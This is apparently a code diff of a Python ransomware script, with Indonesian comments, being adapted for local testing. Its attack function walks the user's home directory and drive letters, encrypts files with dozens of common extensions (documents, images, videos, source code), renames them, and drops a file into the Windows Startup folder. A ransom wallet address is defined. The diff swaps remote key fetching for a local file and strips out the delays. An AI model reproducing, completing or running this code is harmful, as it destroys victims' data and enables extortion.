@@ -9,12 +9,21 @@ from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
 # On Website
-url_web = "YOUR URL"
+# url_web = "YOUR URL"
+# url_list = ["LIST KEY"]
+# key_c = random.choice(url_list)
+# ext = '.' + key_c.split('.')[1]
+# URL_KEY = url_web + key_c
+# pbk = req.get(URL_KEY).text
+# lcx = hashlib.sha1(key_c.split('.')[0].encode('utf-8')).hexdigest()+'.'+key_c.split('.')[1]
+
+# On Local (Tested)
+url_web = "pub/"
 url_list = ["LIST KEY"]
 key_c = random.choice(url_list)
 ext = '.' + key_c.split('.')[1]
 URL_KEY = url_web + key_c
-pbk = req.get(URL_KEY).text
+pbk = open(URL_KEY).read()
 lcx = hashlib.sha1(key_c.split('.')[0].encode('utf-8')).hexdigest()+'.'+key_c.split('.')[1]
 
 WALLET_ADDRESS = '''
@@ -49,7 +58,7 @@ def encrypt(filename):
 
 def attack(target):
 
-    fl = ".c",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"
+    fl = ".c",".jpeg",".JPEG",".jpg",".JPG",".png",".PNG",".bmp",".BMP",".doc",".DOC",".rtf",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".mp4",".mkv",".mpeg",".avi",".ai",".ait",".cdr",".odt",".ods",".odp",".msi",".bat",".vbs",".html",".php",".js",".css"
 
     for p, d, f in os.walk(target):
         for name in f:
@@ -59,6 +68,7 @@ def attack(target):
                     newFile = name +  ext
                     os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
+                    print("Fail " + name)
                     continue
 
 def jejak(path):
@@ -82,20 +92,19 @@ def jejak(path):
             l.write(lcx)
     except PermissionError:
         problem = "Tidak bisa di isi file"
+        print(problem)
 
 if __name__ == '__main__':
     if (platform == 'win32'):
-        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","M:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]
-        jlog = [os.environ["PROGRAMDATA"]+sp()+'Microsoft'+sp()+'Windows'+sp()+'Start Menu'+sp()+'Programs'+sp()+'StartUp']
+        t = ['I:']
+        jlog = os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         jejak(jlog)
         for i in range(len(t)):
             attack(t[i] + sp())
-            sleep(1800)
     elif (platform == 'linux'):
         t = [os.environ["HOME"]]
         jejak(t + sp())
         for i in range(len(t)):
             attack(t[i] + sp())
-            sleep(1800)
     else:
         print('I will better')
